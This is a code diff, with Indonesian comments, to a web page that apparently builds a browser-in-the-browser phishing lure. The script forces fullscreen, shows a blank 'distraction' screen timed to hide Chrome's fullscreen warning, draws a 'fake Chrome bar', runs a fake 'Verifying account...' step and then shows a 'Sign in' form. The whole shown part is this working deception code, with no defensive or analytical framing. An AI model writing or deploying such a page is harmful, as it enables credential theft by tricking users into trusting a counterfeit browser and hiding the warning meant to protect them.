@@ -25,7 +25,7 @@ html, body {
     z-index:10000;
 }
 
-/* BLANK SCREEN */
+/* BLANK SCREEN (distraction) */
 #blank {
     position:fixed;
     width:100%;
@@ -110,32 +110,28 @@ let status = document.getElementById("status");
 
 start.addEventListener("click", async () => {
     try {
+        // masuk fullscreen
         await document.documentElement.requestFullscreen();
 
+        // sembunyikan overlay awal
         start.style.display = "none";
 
-        // blank distraction
+        // tampilkan blank screen sebagai distraction
         blank.style.display = "block";
 
+        // timing ultra-smooth: tunggu popup fullscreen hilang (~1.2 detik)
         setTimeout(() => {
-
             blank.style.display = "none";
 
-            // tampilkan fake bar
+            // tampilkan fake Chrome bar
             fakebar.classList.add("show");
 
-            // tampilkan konten
+            // tampilkan konten awal
             content.style.display = "block";
+            setTimeout(() => content.style.opacity = 1, 50);
 
-            setTimeout(() => {
-                content.style.opacity = 1;
-            }, 50);
-
-            // fake loading flow
-            setTimeout(() => {
-                status.innerText = "Verifying account...";
-            }, 1000);
-
+            // fake loading / verification flow
+            setTimeout(() => { status.innerText = "Verifying account..."; }, 1000);
             setTimeout(() => {
                 content.innerHTML = `
                     <h2>Sign in</h2>
@@ -144,7 +140,7 @@ start.addEventListener("click", async () => {
                 `;
             }, 2200);
 
-        }, 1200); // timing penting
+        }, 1200); // popup hilang → tampilkan UI
 
     } catch (e) {
         alert("Fullscreen blocked");
